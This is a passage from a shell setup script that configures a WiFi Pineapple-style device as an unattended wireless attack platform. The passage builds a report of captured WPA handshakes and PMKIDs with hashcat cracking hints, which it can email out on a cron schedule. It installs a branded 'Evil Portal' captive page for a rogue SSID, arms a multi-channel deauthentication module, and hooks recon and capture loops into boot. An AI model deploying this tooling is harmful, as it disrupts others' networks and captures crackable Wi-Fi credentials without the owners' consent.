{ echo "== $(uci get system.@system[0].hostname) report $TS =="; echo "Uptime:$(uptime)"
  echo; echo "Handshake/PMKID capture: $PC pcapng files, $HN networks w/ EAPOL, $PM PMKID hits"
  printf '%s\n' "$HS" | sed 's/^/   - /' | head -40
  echo "   [extract: hcxpcapngtool $HSD/*.pcapng -o hs.22000 ; crack: hashcat -m 22000]"
  echo; echo "Recon DB:"; [ -f "$DB" ] && /sd/usr/bin/python /sd/bot/recondump.py "$DB" 2>/dev/null || echo " (none)"
} > "$RPTF" 2>&1
[ -x /usr/bin/bot-mail ] && [ -n "$TO" ] && cat "$RPTF" | bot-mail "$(uci get system.@system[0].hostname) report ($HN HS-nets)" "$TO"
echo "$(date) report $RPTF -> ${TO:-file only}" >> /sd/bot-report.log
RPT
chmod +x /usr/bin/bot-report

# ---- protected SSIDs --------------------------------------------------------
if [ "$DO_PROTECT" = y ]; then
  { echo "# Protected SSIDs (never deauthed). Trailing * = prefix."
    echo "$PROTECT_RAW" | tr ',' '\n' | sed 's/^ *//;s/ *$//' | grep -v '^$'
  } > /sd/bot/protect-ssids.conf
  [ -x /sd/bot/wl-refresh.sh ] && /sd/bot/wl-refresh.sh >/dev/null 2>&1
  c_ok "protected list built"
fi

# ---- Evil Portal ------------------------------------------------------------
if [ "$DO_PORTAL" = y ]; then
  c_b "Installing captive portal…"
  PDIR=/sd/portals/portal; mkdir -p "$PDIR"
  # Primary accent is your choice; the secondary/tertiary shades stay warm to keep contrast readable.
cat > "$PDIR/index.php" <<'SAI_PORTAL_EOF'
<?php
// Shadow-Apple Evil Portal template. setup.sh substitutes the {{PLACEHOLDERS}}.
// The <form> POST to /captiveportal/index.php is REQUIRED — it is what authorizes
// the client (whitelists them for internet). Do not change that action.
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Pragma" content="no-cache"><meta http-equiv="Expires" content="0">
<title>{{PORTAL_TITLE}}</title>
<style>
  :root{ --o:{{ACCENT}}; --o2:{{ACCENT2}}; --o3:{{ACCENT3}}; --ink:#050506; }
  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
  html,body{height:100%}
  body{background:var(--ink);color:#f4f1ea;overflow:hidden;font-family:"Segoe UI",system-ui,-apple-system,Roboto,Helvetica,Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;position:relative}
  #bg{position:fixed;inset:0;width:100%;height:100%;z-index:0;display:block}
  .aura{position:fixed;inset:-20%;z-index:0;pointer-events:none;background:radial-gradient(600px 600px at var(--mx,50%) var(--my,40%), rgba(255,122,24,.28), rgba(255,122,24,.06) 40%, transparent 65%);transition:background .12s linear}
  .grain{position:fixed;inset:0;z-index:1;pointer-events:none;opacity:.35;background:repeating-linear-gradient(0deg,rgba(255,255,255,.015) 0 1px,transparent 1px 3px);mix-blend-mode:overlay}
  .wrap{position:relative;z-index:2;width:100%;max-width:430px;padding:22px}
  .card{position:relative;border-radius:22px;padding:34px 28px 30px;background:linear-gradient(160deg, rgba(20,16,12,.86), rgba(8,7,7,.92));border:1px solid rgba(255,140,40,.22);box-shadow:0 24px 80px rgba(0,0,0,.7),0 0 0 1px rgba(255,122,24,.05) inset,0 0 60px rgba(255,122,24,.12);-webkit-backdrop-filter:blur(6px);backdrop-filter:blur(6px);overflow:hidden}
  .card::before{content:"";position:absolute;inset:-1px;border-radius:22px;padding:1px;z-index:-1;background:conic-gradient(from var(--a,0deg), transparent 0 55%, rgba(255,157,60,.75) 72%, rgba(255,183,71,.9) 80%, transparent 92%);-webkit-mask:linear-gradient(#000 0 0) content-box,linear-gradient(#000 0 0);-webkit-mask-composite:xor;mask-composite:exclude;animation:spin 6s linear infinite;opacity:.9}
  @keyframes spin{to{--a:360deg}}
  @property --a{syntax:'<angle>';inherits:false;initial-value:0deg}
  .badge{display:flex;align-items:center;gap:12px;margin-bottom:20px}
  .glyph{width:52px;height:52px;flex:0 0 auto;display:grid;place-items:center;border-radius:14px;background:radial-gradient(circle at 30% 25%,rgba(255,157,60,.28),rgba(255,122,24,.08));border:1px solid rgba(255,140,40,.35);box-shadow:0 0 24px rgba(255,122,24,.25)}
  .glyph svg{width:30px;height:30px}
  .wifi-arc{transform-origin:12px 20px;animation:pop 2.4s ease-in-out infinite}
  .wifi-arc.b{animation-delay:.25s}.wifi-arc.c{animation-delay:.5s}
  @keyframes pop{0%,70%,100%{opacity:.35}12%{opacity:1}}
  .brand{font-size:12px;letter-spacing:.32em;text-transform:uppercase;color:var(--o3);font-weight:700}
  .net{font-size:12px;color:#9a938a;margin-top:2px;letter-spacing:.04em}
  h1{font-size:26px;line-height:1.15;font-weight:800;letter-spacing:.01em;margin:6px 0 10px;background:linear-gradient(92deg,#fff 10%,var(--o3) 55%,var(--o) 100%);-webkit-background-clip:text;background-clip:text;color:transparent;text-shadow:0 0 30px rgba(255,122,24,.15)}
  .sub{font-size:14px;color:#b7b0a6;line-height:1.5;margin-bottom:18px}
  .terms{max-height:104px;overflow:auto;font-size:11.5px;line-height:1.6;color:#8f887e;background:rgba(0,0,0,.35);border:1px solid rgba(255,255,255,.05);border-radius:12px;padding:12px 14px;margin-bottom:16px}
  .terms b{color:#c8c0b4}
  .agree{display:flex;align-items:flex-start;gap:12px;cursor:pointer;user-select:none;margin-bottom:20px;font-size:13.5px;color:#d7d0c6}
  .box{position:relative;width:24px;height:24px;flex:0 0 auto;border-radius:7px;margin-top:1px;background:rgba(255,255,255,.04);border:1.5px solid rgba(255,140,40,.5);transition:.2s}
  .box svg{position:absolute;inset:0;margin:auto;width:15px;height:15px;stroke:#0a0705;stroke-width:3.5;fill:none;stroke-dasharray:20;stroke-dashoffset:20;transition:stroke-dashoffset .25s ease}
  input#agree{position:absolute;opacity:0;width:0;height:0}
  input#agree:checked + .box{background:linear-gradient(145deg,var(--o2),var(--o));border-color:var(--o3);box-shadow:0 0 18px rgba(255,122,24,.5)}
  input#agree:checked + .box svg{stroke-dashoffset:0}
  .btn{position:relative;width:100%;border:0;border-radius:14px;padding:16px 18px;cursor:pointer;font-family:inherit;font-size:15px;font-weight:800;letter-spacing:.14em;text-transform:uppercase;color:#2a1400;background:linear-gradient(100deg,var(--o) 0%,var(--o3) 50%,var(--o) 100%);background-size:220% 100%;box-shadow:0 12px 34px rgba(255,122,24,.4),0 0 0 1px rgba(255,183,71,.4) inset;transition:transform .12s,box-shadow .2s,filter .2s,opacity .2s;overflow:hidden}
  .btn:disabled{filter:grayscale(.9) brightness(.5);opacity:.55;cursor:not-allowed;box-shadow:none;color:#6b6157}
  .btn:not(:disabled){animation:shine 3.2s linear infinite}
  .btn:not(:disabled):active{transform:scale(.98)}
  @keyframes shine{0%{background-position:0% 0}100%{background-position:220% 0}}
  .btn span{position:relative;z-index:1}
  .foot{text-align:center;margin-top:16px;font-size:10.5px;letter-spacing:.18em;text-transform:uppercase;color:#6b645b}
  .dot{display:inline-block;width:6px;height:6px;border-radius:50%;background:var(--o);box-shadow:0 0 8px var(--o);margin-right:6px;vertical-align:middle;animation:blink 1.6s infinite}
  @keyframes blink{50%{opacity:.25}}
  @media (max-height:640px){.terms{max-height:70px}h1{font-size:22px}.card{padding:26px 22px}}
</style>
</head>
<body>
<canvas id="bg"></canvas>
<div class="aura" id="aura"></div>
<div class="grain"></div>
<div class="wrap">
  <div class="card">
    <div class="badge">
      <div class="glyph">
        <svg viewBox="0 0 24 24">
          <path class="wifi-arc c" d="M2 8.5a15 15 0 0 1 20 0" fill="none" stroke="#ff9d3c" stroke-width="2.2" stroke-linecap="round"/>
          <path class="wifi-arc b" d="M5 12a10 10 0 0 1 14 0" fill="none" stroke="#ffb347" stroke-width="2.2" stroke-linecap="round"/>
          <path class="wifi-arc" d="M8 15.4a5 5 0 0 1 8 0" fill="none" stroke="#ffd08a" stroke-width="2.2" stroke-linecap="round"/>
          <circle cx="12" cy="19" r="1.7" fill="#ffd08a"/>
        </svg>
      </div>
      <div>
        <div class="brand">{{BRAND_LABEL}}</div>
        <div class="net">You are connected to &middot; {{NETWORK_NAME}}</div>
      </div>
    </div>

    <h1>{{PORTAL_HEADLINE}}</h1>
    <p class="sub">{{PORTAL_SUBTITLE}}</p>

    <div class="terms">{{TERMS_TEXT}}</div>

    <label class="agree">
      <input type="checkbox" id="agree">
      <span class="box"><svg viewBox="0 0 24 24"><polyline points="4,12 10,18 20,6"/></svg></span>
      <span>I have read and agree to the Terms of Use.</span>
    </label>

    <form method="POST" action="/captiveportal/index.php" id="authForm">
      <input type="hidden" name="target" value="<?php echo htmlspecialchars($destination, ENT_QUOTES); ?>">
      <button class="btn" id="authBtn" type="submit" disabled><span>{{BUTTON_TEXT}}</span></button>
    </form>

    <div class="foot"><span class="dot"></span>Secure gateway &middot; Authorization required</div>
  </div>
</div>
<script>
(function(){
  var cb=document.getElementById('agree'), btn=document.getElementById('authBtn');
  cb.addEventListener('change',function(){btn.disabled=!cb.checked;});
  var aura=document.documentElement;
  function setAura(x,y){aura.style.setProperty('--mx',(x/innerWidth*100)+'%');aura.style.setProperty('--my',(y/innerHeight*100)+'%');}
  var c=document.getElementById('bg'); if(!c||!c.getContext){return;}
  var x=c.getContext('2d'), W,H,DPR=Math.min(window.devicePixelRatio||1,2), P=[], N;
  var pt={x:innerWidth/2,y:innerHeight*.4}, gl={x:pt.x,y:pt.y};
  function rs(){W=c.width=innerWidth*DPR;H=c.height=innerHeight*DPR;c.style.width=innerWidth+'px';c.style.height=innerHeight+'px';
    N=Math.max(28,Math.min(70,Math.floor(innerWidth/22)));P=[];
    for(var i=0;i<N;i++){P.push({x:Math.random()*W,y:Math.random()*H,vx:(Math.random()-.5)*.25*DPR,vy:(Math.random()-.5)*.25*DPR,r:(Math.random()*1.6+.6)*DPR});}}
  rs();window.addEventListener('resize',rs);
  function move(px,py){pt.x=px*DPR;pt.y=py*DPR;setAura(px,py);}
  window.addEventListener('mousemove',function(e){move(e.clientX,e.clientY);});
  window.addEventListener('touchmove',function(e){if(e.touches[0])move(e.touches[0].clientX,e.touches[0].clientY);},{passive:true});
  var t=0;
  function loop(){
    t+=0.008; gl.x+=(pt.x-gl.x)*.06; gl.y+=(pt.y-gl.y)*.06;
    x.clearRect(0,0,W,H);
    var g=x.createRadialGradient(gl.x,gl.y,0,gl.x,gl.y,Math.max(W,H)*.5);
    g.addColorStop(0,'rgba(255,122,24,.28)');g.addColorStop(.25,'rgba(255,100,20,.10)');g.addColorStop(.6,'rgba(255,90,10,.02)');g.addColorStop(1,'rgba(0,0,0,0)');
    x.fillStyle=g;x.fillRect(0,0,W,H);
    var ax=W*(.5+.35*Math.sin(t*.7)), ay=H*(.4+.3*Math.cos(t*.5));
    var g2=x.createRadialGradient(ax,ay,0,ax,ay,W*.4); g2.addColorStop(0,'rgba(255,150,50,.08)');g2.addColorStop(1,'rgba(0,0,0,0)');x.fillStyle=g2;x.fillRect(0,0,W,H);
    for(var i=0;i<N;i++){var p=P[i];p.x+=p.vx;p.y+=p.vy;
      if(p.x<0)p.x=W;if(p.x>W)p.x=0;if(p.y<0)p.y=H;if(p.y>H)p.y=0;
      var dgx=p.x-gl.x,dgy=p.y-gl.y,dg=Math.sqrt(dgx*dgx+dgy*dgy),near=dg<160*DPR;
      x.beginPath();x.arc(p.x,p.y,p.r,0,6.283);x.fillStyle=near?'rgba(255,183,71,.95)':'rgba(255,140,50,.5)';x.fill();
      for(var j=i+1;j<N;j++){var q=P[j],dx=p.x-q.x,dy=p.y-q.y,d=Math.sqrt(dx*dx+dy*dy);
        if(d<130*DPR){x.beginPath();x.moveTo(p.x,p.y);x.lineTo(q.x,q.y);x.strokeStyle='rgba(255,130,40,'+(0.14*(1-d/(130*DPR)))+')';x.lineWidth=DPR*.6;x.stroke();}}
      if(near){x.beginPath();x.moveTo(p.x,p.y);x.lineTo(gl.x,gl.y);x.strokeStyle='rgba(255,183,71,'+(0.4*(1-dg/(160*DPR)))+')';x.lineWidth=DPR*.8;x.stroke();}
    }
    requestAnimationFrame(loop);
  }
  loop();
})();
</script>
</body>
</html>
SAI_PORTAL_EOF
  sed -i "s/{{NETWORK_NAME}}/$(sedesc "$ROGUE_SSID")/g;
          s/{{PORTAL_TITLE}}/Guest WiFi Access/g;
          s/{{BRAND_LABEL}}/Guest Network/g;
          s/{{PORTAL_HEADLINE}}/$(sedesc "$PORTAL_HEADLINE")/g;
          s#{{PORTAL_SUBTITLE}}#Complimentary internet access. Accept the terms to get online.#g;
          s#{{TERMS_TEXT}}#<b>Terms of Use.</b> Courtesy public network provided as-is with no warranty. By connecting you agree to lawful, responsible use and acknowledge open-network traffic is not private. Do not transmit sensitive credentials over open WiFi.#g;
          s/{{BUTTON_TEXT}}/Connect to Internet/g;
          s/{{ACCENT}}/$(sedesc "$PORTAL_ACCENT")/g;
          s/{{ACCENT2}}/#ff9d3c/g; s/{{ACCENT3}}/#ffb347/g" "$PDIR/index.php"
  # activate it (symlink into /www, ensure captiveportal DNAT service on)
  [ -f "$PDIR/MyPortal.php" ] || printf '<?php namespace evilportal;\nclass MyPortal extends Portal { public function handleAuthorization(){ parent::handleAuthorization(); } }\n' > "$PDIR/MyPortal.php"
  [ -f "$PDIR/helper.php" ] || echo '<?php' > "$PDIR/helper.php"
  echo '{"name":"portal","type":"basic"}' > "$PDIR/portal.ep"
  for f in index.php MyPortal.php helper.php portal.ep; do [ -e "/www/$f" ] && [ ! -L "/www/$f" ] && mv "/www/$f" "/www/$f.ep_backup"; ln -sf "$PDIR/$f" "/www/$f"; done
  ln -sf /pineapple/modules/EvilPortal/includes/api /www/captiveportal 2>/dev/null
  c_ok "portal branded '$ROGUE_SSID' and activated"
fi

# ---- boot mode --------------------------------------------------------------
c_b "Wiring boot mode: $MODE"
# deauth module defaults (used by switch/auto modes + manual panel use)
if [ "$MODE" = switch ] || [ "$MODE" = auto ]; then
  touch /etc/config/deauth
  uci -q get deauth.settings >/dev/null 2>&1 || { echo "config deauth 'run'"; echo "config deauth 'settings'"; echo "config deauth 'autostart'"; echo "config deauth 'module'"; } >> /etc/config/deauth
  uci set deauth.settings.mode='whitelist'; uci set deauth.settings.channel='1,6,11,36,149'; uci set deauth.settings.channels='1,6,11,36,149'
  uci set deauth.autostart.interface='wlan1mon'; uci set deauth.module.installed='1'; uci commit deauth
fi
BOOT_CMD=""
case "$MODE" in
  switch) BOOT_CMD="/sd/bot/switch-mode.sh" ;;
  auto)   BOOT_CMD="/sd/bot/recon-capture-loop.sh 300 900" ;;
  recon)  cat > /sd/bot/recon-only.sh <<'RO'
#!/bin/sh
export LD_LIBRARY_PATH=/sd/usr/lib:/sd/lib:/usr/lib:/lib
while true; do pineap /tmp/pineap.conf run_scan 60 2 >/dev/null 2>&1
  W=0; while [ $W -lt 75 ]; do pineap /tmp/pineap.conf get_status 2>/dev/null | grep scanRunning | grep -q true || break; sleep 5; W=$((W+5)); done; done
RO
          chmod +x /sd/bot/recon-only.sh; BOOT_CMD="/sd/bot/recon-only.sh" ;;
esac
if [ -n "$BOOT_CMD" ]; then
  BN=$(basename "$(echo "$BOOT_CMD" | awk '{print $1}')")   # process name only (strip args)
  cat > /usr/bin/bot-autostart <<AUTO
#!/bin/sh
export LD_LIBRARY_PATH=/sd/usr/lib:/sd/lib:/usr/lib:/lib
mkdir -p /tmp/handshakes /sd/handshakes
# quarantine a malformed recon.db (unclean shutdown / ext4 journal loss) so pineapd can recreate it & start
[ -f /sd/recon.db ] && ! /sd/usr/bin/python -c "import sqlite3,sys; sys.exit(0 if sqlite3.connect('/sd/recon.db').execute('pragma integrity_check').fetchone()[0]=='ok' else 1)" 2>/dev/null && mv /sd/recon.db "/sd/recon.db.malformed.\$(cut -d. -f1 /proc/uptime 2>/dev/null)" 2>/dev/null
n=0; while ! pgrep pineapd >/dev/null 2>&1 && [ \$n -lt 20 ]; do /etc/init.d/pineapd start >/dev/null 2>&1; sleep 3; n=\$((n+1)); done
sleep 5
pineap /tmp/pineap.conf logging on >/dev/null 2>&1; pineap /tmp/pineap.conf capture_ssids on >/dev/null 2>&1
pgrep -f "$BN" >/dev/null 2>&1 || ( $BOOT_CMD >/dev/null 2>&1 & )
AUTO
  [ "$DO_MAIL" = y ] && echo "( sleep 200; /usr/bin/bot-report $REPORT_TO ) >/dev/null 2>&1 &" >> /usr/bin/bot-autostart
  chmod +x /usr/bin/bot-autostart
  # add the boot hook: insert before 'exit 0' if present, else append (never clobber)
  touch /etc/rc.local
  if ! grep -q 'bot-autostart' /etc/rc.local; then
    if grep -q '^exit 0' /etc/rc.local; then
      awk '/^exit 0/ && !d {print "( sleep 30; /usr/bin/bot-autostart ) &"; d=1} {print}' /etc/rc.local > /tmp/rc.new && cat /tmp/rc.new > /etc/rc.local && rm -f /tmp/rc.new
    else
      echo '( sleep 30; /usr/bin/bot-autostart ) &' >> /etc/rc.local
    fi
  fi
  ( sleep 2; /usr/bin/bot-autostart ) >/dev/null 2>&1 &
  c_ok "boot mode '$MODE' wired + started"
fi
# report cron
if [ "$DO_MAIL" = y ]; then
  touch /etc/crontabs/root
  grep -q 'bot-report' /etc/crontabs/root || echo "0 */$REPORT_HRS * * * /usr/bin/bot-report $REPORT_TO" >> /etc/crontabs/root
  /etc/init.d/cron enable >/dev/null 2>&1; /etc/init.d/cron restart >/dev/null 2>&1
  c_ok "report cron every ${REPORT_HRS}h"
fi

echo; c_hr; c_b "DONE — $HOSTNAME is configured."
echo "  Panel : http://172.16.42.1:1471/   (root / your password)"
[ "$DO_MGMT" = y ] && echo "  Wireless admin: join '$MGMT_SSID'"
[ "$MODE" = switch ] && echo "  Switch: LEFT = recon (green LED) · RIGHT = deauth+capture (red LED)"
[ "$MODE" = switch ] && echo "  Boot is ALWAYS recon (green) — deauth never auto-starts, so a wedge can't loop."
[ "$MODE" = switch ] && echo "  To arm deauth: move the switch LEFT then RIGHT. Full power-cycle if the USB radio ever wedges."
echo
yesno "Reboot now to validate the full boot path?" "n" && { echo "Rebooting…"; sync; reboot; }
